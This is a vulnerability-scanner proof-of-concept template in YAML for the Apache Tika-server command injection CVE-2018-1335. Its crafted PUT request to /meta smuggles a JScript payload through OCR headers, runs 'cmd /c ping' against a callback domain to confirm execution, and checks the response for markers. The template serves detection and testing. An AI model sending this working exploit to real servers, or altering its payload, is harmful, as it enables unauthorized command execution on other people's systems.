name: poc-yaml-tika-cve-2018-1335-rce
binding: c535956e-2ac0-43a5-8eda-8c559c73be31
manual: true
detail:
    author: Xz
    links:
        - https://www.exploit-db.com/exploits/46540
    description: Apache Tika-server < 1.18 - Command Injection
    vulnerability:
        id: CT-71046
        level: high
transport: http
set:
    reverse: newReverse()
    reverseDNS: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: PUT
            path: /meta
            headers:
                Connection: close
                Content-Type: image/jp2
                Expect: 100-continue
                X-Tika-OCRLanguage: //E:Jscript
                X-Tika-OCRTesseractPath: '"cscript"'
            body: |
                var oShell = WScript.CreateObject("WScript.Shell");var oExec = oShell.Exec('cmd /c ping {{reverseDNS}}');
        expression: reverse.wait(5) && response.body.bcontains(b"org.apache.tika.parser.DefaultParser") && response.headers["Content-Type"].contains("text/csv")
expression: r0()
